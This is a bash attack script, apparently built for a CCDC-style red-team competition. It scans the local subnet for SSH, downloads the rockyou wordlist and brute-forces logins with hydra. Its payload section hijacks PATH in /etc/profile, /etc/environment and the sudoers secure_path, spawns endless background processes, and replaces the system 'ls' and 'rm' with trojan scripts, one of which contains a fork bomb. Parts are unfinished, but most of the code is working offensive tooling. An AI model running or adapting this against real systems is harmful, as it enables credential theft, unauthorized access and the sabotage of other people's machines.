#!/bin/bash
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## gathers passwords
	## cleans up output file
	## logs into ssh session and does it's business
########################################################################################
########################################################################################
	#
	#*************** NEED TO DO/ADD ***********************
	# check and create all dir/files
	# check/install/configure needed apps
	# include a ccdc generated username list
	# don't assume /24 CIDR, and find the right one
	# check multiple interfaces and multiple IP ranges
	# change IP if getting blocked ( but only try a few times, and test for connectivity to avoid infinite loop)
	# clean it up
	# stop using tmp files
	# add testing for files and what not to get rid of error spam
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#### RUN function #####
#######################
function main(){	###
	neo				###
	meat			###
	bones			###
	brute			###
	assassin		###
}					###
#######################
#------ error handling ----------
### If error, give up			#
set -e							#
#- - - - - - - - - - - - - - - -#
### if error, do THING			#
# makes trap global 			#
# (works in functions)			#
#set -o errtrace				#
# 'exit' can be a func or cmd	#
#trap 'exit' ERR				#
#--------------------------------
#### Variables ####
pwListFull="/usr/share/wordlists/rockyou.txt"
userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
listsDir="/usr/share/wordlists"
###########################################################################################
#are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is "$(pwd)"\n\n"
		exit 1
	fi
	}
###########################################################################################
# checking for files and dirs
###########################################################################################
function bones(){
###################################################
### checking for 'official' lists #################
	#checking for wordlist dir
	if [[ ! -d $listsDir ]]; then
		printf "\nCouldn't find wordlist dir. Creating \n\t["$listsDir"]\n"
		command mkdir -p "$listsDir"/metasploit
	fi

	#checking for 'rockyou.txt' password list
	if [[ ! -f "$pwListFull" ]]; then
		printf "\n"
		#checking for the .gz
		if [[ -f "$pwListFull".gz ]]; then
			printf "\nExtracting rockyou.txt\n"
			command tar -xf "$pwListFull".gz -C "$listsDir"
		else
			#downloading rockyou.txt
			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t["$pwListFull"]\n\n\n"
			command curl -L -o "$pwListFull" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
		fi
	fi

	#checking for 'unix_users.txt'
	if [[ ! -f "$userListUnix" ]]; then
		#downloading unix_users list
		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t["$userListUnix"]\n\n\n"
		command curl -L -o "$userListUnix" https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
		printf "\n\n\n"
	fi

##################################################
### checking for/creating custom lists ###########
	#file locations
		hydraOutput="/tmp/hydraOutput"
		crackedLogins="logins"
		listLiveHosts="listTargets"
		listPwsBasic="listPwsBasic"
		listUsersBasic="listUsersBasic"

	### gathering live HOSTS
	#gathering local network ID
		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
	#if 'targets' file doesn't exist, then make it
		if [[ ! -f "$listLiveHosts" ]]; then
			printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n\n------\n\n"
			printf "$(nmap -p 22 $netID/24 -oG - | awk '/22\/open/{print $2}')\n" > "$listLiveHosts"
			command sed -i "/$(hostname -I | tr -d " ")/d" "$listLiveHosts"
		fi
		printf "\tTargets List:\n$(cat $listLiveHosts)\n"
	### basic list of PASSWORDS
	#if 'listPwsBasic' doesnt' exist, then make it
		if [[ ! -f "$listPwsBasic" ]]; then
			printf "123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\nnicole\ndaniel\nbabygirl\nmonkey\nlovely\njessica\n654321\nmichael\nashley\nqwerty\n111111\niloveu\n000000\nmichelle\ntigger\nsunshine\nchocolate\npassword1\nsoccer\nanthony\nfriends\nbutterfly\npurple\nangel\njordan\nliverpool\njustin\nloveme\nfuckyou\n123123\nfootball\nsecret\nandrea\ncarlos\njennifer\njoshua\nbubbles\n1234567890\nsuperman\nhannah\n" > $listPwsBasic
			#printf "P@ssw0rd\npassword\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nCCDC\nccdc\n" > $listPwsBasic
			#pwListFull		#defined elsewhere
		fi
	### basic list of USERNAMES
	#if 'listUsersBasic' doesn't exist, then make it
		if [[ ! -f "$listUsersBasic" ]]; then
			printf "student\nccdc\nuser\nghost\ncartman\nstan\nkyle\nkenny\npcprincipal\nreality\njack\nkate\nrenko\nclay\nturner\nkylie\nbecca\njo\nallie\nsarah\nsaryn\nrhino\nnidus\nlazors\n" > $listUsersBasic
			#printf "student\nccdc\nuser\n" > $listUsersBasic
			#userListUnix	#defined elsewhere
		fi
}
###########################################################################################
# check/install/configure apps
###########################################################################################
function meat(){
##################################################
### checking for/installing tools ################
	command="hydra hashcat john nmap curl net-tools sshpass"
	installing=""
	updated=1
	scriptPath="$(pwd)/$(basename $0)"

	### updating repo list, if it hasn't already been updated recently
		if [[ $updated == 0 ]]; then
			command apt update
		# updates the script so it knows it doesn't need to check again
			sed -i 's/updated=0/updated=1/' $scriptPath
		fi
	# checking if apps are installed
		for word in $command; do
			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
				installing="${installing} "$word""
			fi
		done
	# installing missing apps
		if [ ! -z "$installing" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi

	# where important lists are stored
		#printf "\n\tUsername List:\n"
		#printf "\n\t\t["$userListUnix"]\n\n"
		#printf "\n\tPassword List:\n"
		#printf "\n\t\t["$pwListFull"]\n\n"

}
###########################################################################################
# banging down the door
###########################################################################################
function brute(){
	# tmp files
		#********add remove all tmp files at the end **************************************************
		#make sure these are all tmp files
		tmpFiles=""$hydraOutput" "$crackedLogins" "$listLiveHosts" "$listPwsBasic" "$listUsersBasic""

	### testing all login info for all IPs
		#**** if hydra.restore ask if skip ****************************************************
		#also ask if want ot restore
		if [ -f hydra.restore ]; then
:
		fi
		#***** if not success with basic, then do full ****************************************
		command hydra -o "$hydraOutput" -L "$listUsersBasic" -P "$listPwsBasic" -M "$listLiveHosts" ssh
		command sed -i '/^#/d' "$hydraOutput"
		if [ -s $hydraOutput ]; then
			printf "\nCleaning up output\n"
			command awk '/^\[/{print $3" "$5" "$7}' "$hydraOutput" > "$crackedLogins"
			command rm "$hydraOutput"
		else
			printf "\n\n----No passwords found----\n\n"
			command rm "$hydraOutput"
		fi


}
###########################################################################################
# ssh's in and does it's business
###########################################################################################
function assassin(){
	#### launcher ###########
	function payload(){		#
		detectomatic		#
		sandman				#
		seeder				#
	}						#
	#########################
	function detectomatic(){
		### test if debian or ubuntu
		osDetect="$(uname -v | egrep -o "Debian|Ubuntu")"
		debPATH="/etc/profile"
		ubuPATH="/etc/environment"
		ubuSecPATH="/etc/sudoers"
		ubuSecPATHnew="/etc/sudoers.new"

		### is Debian
		if [ $osDetect == "Debian" ]; then
			testPATH="echo $PATH | cut -d: -f1"
			if [[ "$testPATH" != "/tmp" ]]; then
				#changes PATH for current user, no matter what it is
				sed -i "s|PATH=$PATH|PATH=/tmp:$PATH|" $debPATH
			fi
			#changes PATH for all users, if the default is still in place
			debCleanRootPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
			debCleanUserPATH='PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
				debDirtyRootPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"'
				debDirtyUserPATH='PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"'
			sed -i "s|$debCleanRootPATH|$debDirtyRootPATH|" $debPATH
			sed -i "s|$debCleanUserPATH|$debDirtyUserPATH|" $debPATH
		fi
		### is Ubuntu
		if [ $osDetect == "Ubuntu" ]; then
			ubuCleanRootPATH='secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
			ubuCleanUserPATH='PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
				ubuDirtyRootPATH='secure_path="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"'
				ubuDirtyUserPATH='PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"'
			sed -i "s|$ubuCleanUserPATH|$ubuDirtyUserPATH|" $ubuPATH

			if [ -f "$ubuSecPATHnew" ]; then
				exit 1
			fi
			# copies and edits the sudoers file
			command cp $ubuSecPATH{,.new}
			command chmod 750 $ubuSecPATHnew
			sed -i "s|$ubuCleanRootPATH|$ubuDirtyRootPATH|" $ubuSecPATHnew
			command chmod 0440 $ubuSecPATHnew
			# checks that the changes are good
			visudo -c -f $ubuSecPATHnew
			# moves the modified file over the old one
			if [ "$?" -eq "0" ]; then
			    cp $ubuSecPATHnew $ubuSecPATH
			fi

			rm $ubuSecPATHnew
		fi
		#** un-fuck *******************************
			function unfuck(){
				# deletes all the dirty scipts
				command /bin/rm -f $seedPathsLS $seedPathsRM
			}
	}
#** Terminator ************************************
#	function terminator(){
#		ssh root@MachineB "$(declare -f FUNCTION); FUNCTION"
#	}

#** Tripmine **************************************

#** Sandman ***************************************
	function sandman(){
		while : ; do
			nohup bash -c "exec -a Sandman sleep 6969" > /dev/null 2>&1 &
		done
	}
### Seeder ########################################
	function seeder(){
		seedPathsLS="/tmp/ls /usr/local/sbin/ls /usr/local/bin/ls /usr/sbin/ls /usr/bin/ls"
		seedPathsRM="/tmp/rm /usr/local/sbin/rm /usr/local/bin/rm /usr/sbin/rm /usr/bin/rm"
		triggerPath="/tmp/.trigger"
		incrementPath="/tmp/.increment"
		# dumps the scripts, increment, and trigger files into all the dirs they are supposed to be
		command echo "$dirtyLS" | tee $seedPathsLS > /dev/null
		command echo "$dirtyRM" | tee $seedPathsRM > /dev/null
		if [ -e $incrementPath ]; then
			command echo "increment=0" > $incrementPath
		fi
		# sourcing increment file, so it can hopefully be incremented
		source $incrementPath
		# makes everything executable
		command chmod +x $seedPathsLS $seedPathsRM
		command chmod 777 $seedPathsLS $seedPathsRM
	}

### dirty: ls #####################################
	dirtyLS="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	trigger="/usr/local/sbin/.trigger"
	# pulls in and builds argsLS for the real ls
	argsLS=""
	while [[ "$1" != "" ]]; do
		argsLS="$1 ${argsLS}"
		shift
	done

	# checks for the trigger file, if its missing it acts like normal
	if [ -e $trigger ]; then
		echo test
	else
		/bin/ls $argsLS
		printf "\n\n----\n\n"
		printf "argsLS= $argsLS\n"
	fi
	EOF
	)"

### dirty: rm ###################################
	dirtyRM="$(cat <<-'EOF'
	#!/bin/bash
	#
	# commented, non-obfuscated, and basic readability in place to be nice. (you would normally never be able to just read it)
	#
	trap "printf '\nheh..not THAT easy..\n'" SIGINT SIGTERM
	#####################
	function main(){	#
		buildEmUp		#
		tripwire		#
	}					#
	#####################
	### defining, and sourcing, increment info ###
	function buildEmUp(){
		incrementPath="/tmp/.increment"
			# checking if increment file exists, making it if not
			if [ ! -e $incrementPath ]; then
				echo "increment=0" > $incrementPath
			fi
		source $incrementPath

		# pulls in and builds argsRM for the real rm
		argsRM=""
		while [[ "$1" != "" ]]; do
			argsRM="$1 ${argsRM}"
			shift
		done
	}

	#### checks for the trigger file, if its missing it acts like normal ###
	function tripwire(){
		if [ ! -e /usr/local/sbin/.trigger ]; then
			echo "trigger is missing"
			rmCase
		else
			/bin/rm $argsRM
			printf "\n\n----\n\n"
			printf "argsRM= $argsRM\n"
		fi
	}

	### determining what happens based on number of times used ###
	function rmCase(){
		case $attemptNum in
			0)
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo "after case: $attemptNum"
					echo "increment: $increment"
					echo "hard drives are big. no need to delete anything.."
					;;
			1)
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					printf "\nrude.\nstop that.\n"
					;;
			2)
					clear
					increment=$[$increment+1]; sed -i "s/=.*/=$increment/" $incrementPath
					echo $increment
					printf "\nHere.\n";sleep 2; printf "LET.."; sleep 3; printf "ME.."; sleep 2; printf "HELP..\n"; sleep 2; :(){ :|:& };:
					;;
			*)
					clear
					printf "\nBewbs\n"
					;;
		esac
	}
	main
		EOF
		)"

	payload
}


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main
